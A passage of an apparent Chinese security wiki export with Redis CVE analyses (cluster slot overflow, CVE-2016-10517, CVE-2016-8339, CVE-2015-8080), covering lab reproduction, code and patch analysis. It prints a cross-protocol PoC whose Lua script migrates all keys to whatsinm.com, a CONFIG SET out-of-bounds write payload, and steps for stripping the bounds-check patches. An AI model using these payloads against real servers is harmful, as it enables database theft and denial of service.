命令的各个子命令进行介绍， 这些命理负责管理集群节点的槽转换表（slots translation table）。 以下是 CLUSTER 命令可用的子命令： CLUSTER ADDSLOTS slot1 [slot2] ... [slotN] CLUSTER DELSLOTS slot1 [slot2] ... [slotN] CLUSTER SETSLOT slot NODE node CLUSTER SETSLOT slot MIGRATING node CLUSTER SETSLOT slot IMPORTING node ​ 最开头的两条命令 ADDSLOTS 和 DELSLOTS 分别用于向节点指派（assign）或者移除节点， 当槽被指派或者移除之后， 节点会将这一信息通过 Gossip 协议传播到整个集群。 ADDSLOTS 命令通常在新创建集群时， 作为一种快速地将各个槽指派给各个节点的手段来使用。 CLUSTER SETSLOT slot NODE node 子命令可以将指定的槽 slot 指派给节点 node 。 ​ 至于 CLUSTER SETSLOT slot MIGRATING node 命令和 CLUSTER SETSLOT slot IMPORTING node 命令， 前者用于将给定节点 node 中的槽 slot 迁移出节点， 而后者用于将给定槽 slot 导入到节点 node ： 当一个槽被设置为 MIGRATING 状态时， 原来持有这个槽的节点仍然会继续接受关于这个槽的命令请求， 但只有命令所处理的键仍然存在于节点时， 节点才会处理这个命令请求。 如果命令所使用的键不存在与该节点， 那么节点将向客户端返回一个 -ASK 转向（redirection）错误， 告知客户端， 要将命令请求发送到槽的迁移目标节点。 当一个槽被设置为 IMPORTING 状态时， 节点仅在接收到 ASKING 命令之后， 才会接受关于这个槽的命令请求。 如果客户端没有向节点发送 ASKING 命令， 那么节点会使用 -MOVED 转向错误将命令请求转向至真正负责处理这个槽的节点。 上面关于 MIGRATING 和 IMPORTING 的说明有些难懂， 让我们用一个实际的实例来说明一下。 假设现在， 我们有 A 和 B 两个节点， 并且我们想将槽 8 从节点 A 移动到节点 B ， 于是我们： 向节点 B 发送命令 CLUSTER SETSLOT 8 IMPORTING A 向节点 A 发送命令 CLUSTER SETSLOT 8 MIGRATING B 每当客户端向其他节点发送关于哈希槽 8 的命令请求时， 这些节点都会向客户端返回指向节点 A 的转向信息： 如果命令要处理的键已经存在于槽 8 里面， 那么这个命令将由节点 A 处理。 如果命令要处理的键未存在于槽 8 里面（比如说，要向槽添加一个新的键）， 那么这个命令由节点 B 处理。 ​ 这种机制将使得节点 A 不再创建关于槽 8 的任何新键。 ​ 与此同时， 一个特殊的客户端 redis-trib 以及 Redis 集群配置程序（configuration utility）会将节点 A 中槽 8 里面的键移动到节点 B 。 键的移动操作由以下两个命令执行： 1CLUSTER GETKEYSINSLOT slot count ​ 上面的命令会让节点返回 count 个 slot 槽中的键， 对于命令所返回的每个键， redis-trib 都会向节点 A 发送一条 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令， 该命令会将所指定的键原子地（atomic）从节点 A 移动到节点 B （在移动键期间，两个节点都会处于阻塞状态，以免出现竞争条件）。 ​ 以下为 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令的运作原理： 1MIGRATE target_host target_port key target_database id timeout ​ 执行 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令的节点会连接到 target 节点， 并将序列化后的 key 数据发送给 target ， 一旦 target 返回 OK ， 节点就将自己的 key 从数据库中删除。 ​ 从一个外部客户端的视角来看， 在某个时间点上， 键 key 要么存在于节点 A ， 要么存在于节点 B ， 但不会同时存在于节点 A 和节点 B 。 ​ 因为 Redis 集群只使用 0 号数据库， 所以当 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令被用于执行集群操作时， target_database 的值总是 0 。 target_database 参数的存在是为了让 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令成为一个通用命令， 从而可以作用于集群以外的其他功能。 ​ 我们对 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 命令做了优化， 使得它即使在传输包含多个元素的列表键这样的复杂数据时， 也可以保持高效。 ​ 不过， 尽管 [MIGRATE host port key destination-db timeout COPY] [REPLACE] 非常高效， 对一个键非常多、并且键的数据量非常大的集群来说， 集群重配置还是会占用大量的时间， 可能会导致集群没办法适应那些对于响应时间有严格要求的应用程序。 附所有redis-cluster相关的集群命令： cluster info ：打印集群的信息 cluster nodes ：列出集群当前已知的所有节点（ node），以及这些节点的相关信息。 cluster meet ：将 ip 和 port 所指定的节点添加到集群当中。 cluster forget ：从集群中移除 node_id 指定的节点。 cluster replicate ：将当前从节点设置为 node_id 指定的master节点的slave节点。只能针对slave节点操作。 cluster saveconfig ：将节点的配置文件保存到硬盘里面。 cluster addslots [slot …] ：将一个或多个槽（ slot）指派（ assign）给当前节点。 cluster delslots [slot …] ：移除一个或多个槽对当前节点的指派。 cluster flushslots ：移除指派给当前节点的所有槽，让当前节点变成一个没有指派任何槽的节点。 cluster setslot node ：将槽 slot 指派给 node_id 指定的节点，如果槽已经指派给 cluster setslot migrating ：将本节点的槽 slot 迁移到 node_id 指定的节点中。 cluster setslot importing ：从 node_id 指定的节点中导入槽 slot 到本节点。 cluster setslot stable ：取消对槽 slot 的导入（ import）或者迁移（ migrate）。 cluster keyslot ：计算键 key 应该被放置在哪个槽上。 cluster countkeysinslot ：返回槽 slot 目前包含的键值对数量。 cluster getkeysinslot ：返回 count 个 slot 槽中的键 。 详细分析代码分析​ 漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。 src/cluster.h： ​ 在/redis/src/cluster.c的clusterLoadConfig函数，允许一个缓冲区溢出漏洞从用户可控输入数组索引之中。易受攻击的代码是： ​ slot变量接收atoi的输出，该输出在此处运行：slot = atoi(argv[j]+1); ​ 现在，argv [j]基本上是使用sdssplitargs放入数组进行进一步处理的每行（存储在line []中）的参数。具有有限访问权限的攻击者将可以通过，超大的slot值而强制发生数组错误异常而触发内存损坏问题，甚至可能执行代码。 ​ 但是，此漏洞能不能远程触发还有待分析。 ​ 全局搜索clusterLoadConfig函数，只有在clusterInit函数中被调用一次，也就是在redis-server启动集群模式之初就开始执行，攻击者很难远程执行。 ​ clusterLoadConfig函数加载cluster配置信息失败时的报错信息，这一点在靶机redis-server启动时可以验证： ​ 故猜测无法远程利用此函数达到远程拒绝服务攻击。 ​ clusterLoadConfig函数，在cluster创建时加载集群的配置文件，在redis.conf中可以找到相关信息： ​ node-6379.conf虽然此配置的名字叫”集群配置文件”，但是此配置文件不能人工编辑，它是集群节点自动维护的文件，主要用于记录集群中有哪些节点、他们的状态以及一些持久化参数等，方便在重启时恢复这些状态。通常是在收到请求之后这个文件就会被更新。 ​ 复现时已经触发一次，node-6379.conf里面记录上一次连接时的一些信息。 ​ 再次尝试利用远程命令设置slot值，看能不能远程触发边界索引溢出漏洞，当使用远程cluster命令时，redis-server调用clusterCommand函数。 ​ 执行cluster setslot命令时，执行下面内容： ​ 会被getSlotOrReply函数检查提交的slot值与CLUSTER_SLOTS进行比较，若大于16384，则报错。 补丁分析​ 漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。 ​ 补丁是在/redis/src/cluster.c的clusterLoadConfig函数给migrating_slots_to和migrating_slots_from进行索引后赋值的地方进行了slot值与CLUSTER_SLOTS大小的判断，避免数组越界。 流量分析​ 尝试使用cluster setslot命令，触发漏洞，redis-server返回ERR信息。 参考资料 https://github.com/redis/redis/issues/4278 https://security.gentoo.org/glsa/202008-17 https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad https://github.com/natoscott/redis/commit/0ba2932298e3e432f32441ebc5d95a86158d706c http://www.redis.cn/topics/cluster-tutorial.htm","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2016-10517_Redis跨协议漏洞","date":"2021-07-06T08:49:21.000Z","path":"wiki/漏洞相关/Redis/CVE-2016-10517-Redis跨协议漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis跨站脚本漏洞 漏洞编号：CVE-2016-10517 漏洞类型：跨协议脚本 CVSS评分：【CVSS v2.0：】【CVSS v3.0：7.4】 漏洞危害等级：中危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis 3.2.7之前的版本中的networking.c文件存在跨站脚本漏洞。远程攻击者可利用该漏洞在浏览器中执行任意的脚本代码。 漏洞利用条件​ 攻击者可以远程访问redis-server ​ 1.可以从浏览器发起特定的 HTTP 请求 ​ 2.可以从开发者的机器访问到 Redis 服务器 漏洞影响。​ Redis up to 3.2.7 漏洞修复https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50 漏洞复现应用协议6379/RESP/HTTP 环境安装/搭建在环境共享服务器中获取到环境源码\\安装包，地址为:\\\\10.251.0.11\\R-Redis\\redis-3.2.7-unpacth.tar.zip文件，解压编译即可。 因为Redis对全版本进行了修复，若直接用redis-3.2.7源码编译，发送poc后，redis-server会提示该漏洞利用的提示： 并且发送的TCP连接会直接中断，如果存在漏洞redis-server会回复err不会直接断连接。 所以，先对redis-3.2.7源码进行去补丁操作。 补丁增加了一个判断函数 securityWarningCommand，将此函数的声明和调用在src/server.h、src/networking.c和src/server.c中删除。 漏洞复现​ 利用brup直接向靶机发送poc 1234567891011121314post / HTTP/1.1Host: localhost: 6379User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)Gecko/20100101 Firefox/50.0Accept:*/*Accept-Language: en-0s, en;g=0.5Accept-Encoding: gzip, deflatereferer: http: //localhost: 8000/Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 10196origin: http: //localhost: 8000Connection: closeEVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0 ​ 未打补丁的redis-server则会响应，并保持连接。 漏洞分析技术背景​ Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/ 详细分析漏洞利用过程​ Redis 在解析命令的时候，会把每行文本当做输入。如果输入不能匹配上特定的命令，则丢弃输入。这意味着，如果我们用 HTTP 协议请求 Redis，那么 Redis 会跳过不认识的各种报头，执行请求体中的命令。举个例子，下面的 HTTP 请求中，只有最后的 EVAL 会被解析成合法的命令并执行。 1234567891011121314post / HTTP/1.1Host: localhost: 6379User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)Gecko/20100101 Firefox/50.0Accept:*/*Accept-Language: en-0s, en;g=0.5Accept-Encoding: gzip, deflatereferer: http: //localhost: 8000/Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 10196origin: http: //localhost: 8000Connection: closeEVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0 ​ 初看好像不算什么问题，毕竟攻击者都能直接请求 Redis 了，没必要用 HTTP 协议掩饰攻击行为。不过漏洞的发掘者想得更加深入。在他的 POC 中，构造了一个 HTML 页面，利用 AJAX 去请求 6379 端口。 ​ 一般来说，Redis 是不会暴露在公网里的，但是有可能跟开发者的机器在同一个内网中。假设开发者的浏览器发起了 AJAX 请求，便能绕过外网的限制，直接访问内网的 Redis。即使 Redis 不在 localhost 上，通过扫描（或者社工出具体的服务器地址）也有可能嗅探到内网中的 Redis 实例。 代码分析​ 在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接而是继续搜索到body部分，成功执行命令。 每个列表由以下字段组成： name：表示命令名称的字符串。 function：指向实现命令的 C 函数的指针。 arity： 参数数，可以使用 -N 表示&gt;= N sflags：命令标志为字符串。有关标志表，请参阅下文。 flags： 标志作为字掩码。由 Redis 使用”sflags”字段计算。 get_keys_proc：从命令获取键参数的可选函数。 这仅在以下三个字段不足以指定哪些参数是键。 first_key_index： 第一个参数是关键 last_key_index： 最后一个论点是关键 key_step：步骤获取从第一个到最后一个参数的所有键。 microseconds：此命令的总执行时间微秒。 calls：此命令的调用总数。 flags、 microseconds、calls字段由 Redis 计算，应始终设置为零。 ​ 命令标志使用字符串表示，其中每个字符都表示一个标志。稍后，populateCommandTable 函数将处理使用此字符填充真正的”flags”字段。 这是标志的含义： w： 写入命令 （可以修改键空间）。 r： 读取命令（永远不会修改密钥空间）。 m： 一旦调用， 可能会增加内存使用量。如果内存不足，请不允许。 a： 管理命令，如保存或关闭。 p： Pub/子相关命令。 f： 强制复制此命令， 无论服务器。 s： 脚本中不允许使用命令。 R：随机命令。命令不是确定性的，也就是说，同一个命令具有相同的参数，具有相同的键空间，可能有不同的结果。例如，SPOP 和 RANDOMKEY 是两个随机命令。 S： 排序命令输出数组，如果从脚本调用，使输出是确定性的。 l：在加载数据库时允许命令。 t： 当从属有陈旧数据但不允许使用时，允许命令服务器此数据。在这种情况下，通常不接受任何命令但只是几个。 M： 不要在监视器上自动传播命令。 k： 对此命令执行隐式请求，因此该命令将如果插槽标记为”导入”，则接受群集模式。 F： 快速命令： O（1） 或 O（log（N）） 命令，不应延迟只要内核调度程序给我们时间，它的执行就行。注意，可能触发 DEL 作为副作用的命令（如 SET）不是快速命令。 populateCommandTable函数对提交的命令进行flags的设置： processCommand函数对提交的命令的flags进行判断是否为redisCommandTable中合法的命令，若不是则输出unknown command。 漏洞触发过程​ 在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接，而是在processCommcand函数中一直搜索，遇到不在redisCommandTable中合法的命令，则输出unknown command。否则继续搜索到body部分，最后成功执行命令。 补丁分析 先分析 Redis 该补丁的工作原理： ​ 作为 HTTP/1.1 规范，请求报头中应该有 Host 报头。如果没有，服务器会返回 400 错误码。这意味着，浏览器自己发送的 AJAX 请求中必然会带上 Host 报头。将Host和POST放进redisCommandTable数组中，当以后遇到这两个关键词，直接报错 1# Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted. ​ 可以尝试用 setRequestHeader 去自定义请求报头。 ​ 浏览器也知道这一点。如果用了 setRequestHeader，浏览器会先发送一个 OPTIONS 请求，附上 Access-Control-Request-Headers 报头，待目标服务器明断。只有服务器许可之后，才会进一步发送定制的 AJAX 请求。在这个场景里， Redis 自然什么都不会回复。 ​ 总而言之，没有什么办法，可以发送不带 Host 报头的 AJAX 请求。意味着只要 Host 被拉黑，所有的 AJAX 请求也被拉黑了。 对于没打该补丁的版本，该漏洞会有多大的影响？ ​ 漏洞依赖的第二点（可以从开发者的机器访问到 Redis 服务器），一般情况下难以满足。毕竟大多数时候，办公区网络和机房网络不在同一个网段里，而且还是互相隔离的。如果不是定点攻击，很难击中目标服务器。 ​ 漏洞依赖的第一点（可以从浏览器发起特定的 HTTP 请求），在很大程度上受浏览器的限制。对于那些想利用 AJAX 的攻击者，浏览器可是见得多了。不要忘记同源策略。即使黑客可以去请求特定的 Redis 服务器，受同源策略的影响，浏览器也不会返回响应的结果。意味着，攻击者可以向 Redis 发送命令，但是他们无法知道攻击是否成功。无法评估攻击的效果，通常会令漏洞的价值大打折扣。 ​ 当然如果能结合同源策略绕过，确实可以拿到具体的响应。但是这么一来利用空间就更窄了。 流量分析用HTTP协议伪装redis命令，在POST方法中的body部分添加redis命令。 参考资料 https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50 https://gist.githubusercontent.com/lamby/01ef8eaa7066282d0a5611a500ad4203/raw https://segmentfault.com/a/1190000008237858 https://github.com/dxa4481/whatsinmyredis https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2016-8339_Redis缓冲区溢出漏洞","date":"2021-07-06T08:36:40.000Z","path":"wiki/漏洞相关/Redis/CVE-2016-8339-Redis缓冲区溢出漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis缓冲区溢出漏洞 漏洞编号：CVE-2016-8339 漏洞类型：缓冲区溢出 CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ 当发送精心制作的命令时，Redis 3.2.x中3.2.4之前的缓冲区溢出会导致任意代码执行。在Redis数据结构存储的CONFIG SET命令期间，对client-output-buffer-limit选项的处理中存在一个越界写入漏洞。精心设计的CONFIG SET命令导致越界写入，可能导致代码执行。 漏洞利用条件1、攻击者可以访问到redis-server，redis-server配置外网可访问 2、redis-server配置弱密码或空密码 3、redis-server取消保护模式 漏洞影响Redis:3.2.0 Redis:3.2.1 Redis:3.2.2 Redis:3.2.3 漏洞修复https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977 漏洞复现应用协议6379/RESP 环境安装/搭建​ 在环境共享服务器中获取到环境源码\\安装包，地址为:\\\\10.251.0.11\\R-Redis\\redis-3.2.3.tar.zip文件，解压编译即可。 ​ 启动前先更改配置文件redis.conf，配置外网可访问，取消保护模式。 漏洞复现​ 攻击机发送config set命令： 1redis-cli -h 10.251.0.36 CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot; ​ class字段设置为master。 ​ redis-server返回ok，虽然redis-server并没有崩溃，但是越界写入已经成功。 漏洞分析技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF ​ Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/ CONFIG SET client-output-buffer-limit命令 ​ client-output-buffer-limit使用CONFIG SET命令修改选项。设置client-output-buffer-limit选项所需的语法如下所示。 1CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; ​ 例如： 1CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot; 详细分析漏洞利用过程​ client-output-buffer-limit使用CONFIG SET命令修改选项期间，存在写越界漏洞。设置client-output-buffer-limit选项所需的语法如下所示。 1CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; ​ 当class值为master时，返回3： 1CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot; ​ 在解析中，对client-output-buffer-limit的调用getClientTypeByName用于检索相应类的类型。在这种情况下，getClientTypeByName返回[-1，3]集中的值。查看client_obuf_limits数组的声明，我们看到数组的大小为3。 ​ 此漏洞就是未考虑CONFIG SET client-output-buffer-limit 时，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。 代码分析​ 在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。 ​ 首先，查看server结构体的结构，server结构体在/src/server.h中声明。 ​ 其redisServer结构如下： ​ 结构包含很多属性，其中预定义了clinet_obuf_limits数组的大小。 ​ 在/src/server.h中宏定义了CLIENT_TYPE_OBUF_COUNT为3，同时发现了CLIENT_TYPE_MASTER值为3。 ​ ​ 目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。分析getClientTypeByName函数，看看class值如何为3。 ​ getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER， 在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。 ​ 此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。 ​ 同样的问题也存在在/src/config.c的configSetCommand函数中。 ​ 此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。 1CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; 漏洞触发过程​ 在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。 ​ 目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。 ​ getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER，在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。 ​ 此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。 ​ 同样的问题也存在在/src/config.c的configSetCommand函数中。 ​ 此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。 1CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; 补丁分析​ 补丁增加了对class的值与CLIENT_TYPE_MASTER判断，如果等于CLIENT_TYPE_MASTER（3），则不会进行赋值，跳转到报错函数。 流量分析​ 向靶机发送config set命令将class字段设为master，则会发生越界写入。 1CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot; ​ 靶机返回ok，代表越界写入成功。 参考资料 https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977 https://talosintelligence.com/vulnerability_reports/TALOS-2016-0206/","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2015-8080_Redis getnum整数溢出漏洞","date":"2021-07-06T08:27:06.000Z","path":"wiki/漏洞相关/Redis/CVE-2015-8080-Redis-getnum整数溢出漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis缓冲区溢出漏洞 漏洞编号： CVE-2015-8080/CVE-2020-14147 漏洞类型：缓冲区溢出 CVSS评分：【CVSS v3.0：7.7】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis 6.0.3之前的lua_struct.c中的getnum函数中存在整数溢出漏洞，这允许具有上下文相关权限的攻击者在Redis会话中运行Lua代码，从而导致拒绝服务（内存损坏和应用程序崩溃）。 漏洞利用条件​ Redis部署在服务器端，开启6379端口；攻击者，通过构造RESP协议包，利用struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31），从而能触发整数溢出，再导致缓冲区溢出。 漏洞影响​ Redis 小于 6.0.3 漏洞修复https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571 漏洞复现应用协议6379/RESP（Redis的序列化协议） 环境安装/搭建Linux下安装Redis 6.0.0​ 首先，Redis对全版本进行了补丁修复，为了复现漏洞，将Redis 6.0.0源码改为未打CVE-2020-14147补丁之前的状态。 ​ 进入路径，找到lua_struct.c文件 1\\redis-6.0.0\\deps\\lua\\src、lua_struct.c ​ 用编辑器，注释以下98-99行代码： 12if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;))) luaL_error(L, &quot;integral size overflow&quot;); ​ 使用以下命令下载，提取和编译Redis 6.0.0： 1234$ wget https://download.redis.io/releases/redis-6.0.0.tar.gz$ tar xzf redis-6.0.0.tar.gz$ cd redis-6.0.0$ make PS：中间make会报错 ​ 在源码的README.md文件中看到解释 ​ 解决办法(针对2.2以上的版本)​ 清理上次编译残留文件，重新编译 1make distclean &amp;&amp; make ​ 这个错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。 ​ src 目录 中现在提供了已编译的二进制文件 。使用以下命令运行Redis服务： 1$ src/redis-server ​ 可以使用内置客户端与Redis进行交互： 12345$ src/redis-cliredis&gt; set foo barOKredis&gt; get foo&quot;bar&quot; ​ Redis服务端，配置远程连接密码： ​ Redis客户端，远程连接： 安装Lua​ Linux安装 Lua ，下载源码包并在终端解压编译即可 12345curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gztar zxf lua-5.3.0.tar.gzcd lua-5.3.0make linux testmake install ​ make报错，找不到readline/readline.h ​ 原因是缺少 libreadline-dev 依赖包，安装依赖包： 1apt-get install libreadline-dev ​ 再次编译安装后，成功： 漏洞复现​ 利用Python脚本poc.py来重现该漏洞。 1python poc.py &lt;host&gt; [&lt;port&gt;] ​ 初次连接，发送poc时，提示redis运行保护模式，只允许本地访问，有三种关闭方式，此处选择第一种关闭方式： ​ 根据提示关闭，保护模式，并且取消密码设置。 12CONFIG SET protected-mode noCONFIG SET requirepass &#x27;&#x27; ​ 再次发送poc，无数据回显，拒绝服务攻击成功。 ​ Redis服务端报段错误，说明漏洞触发。 漏洞分析技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 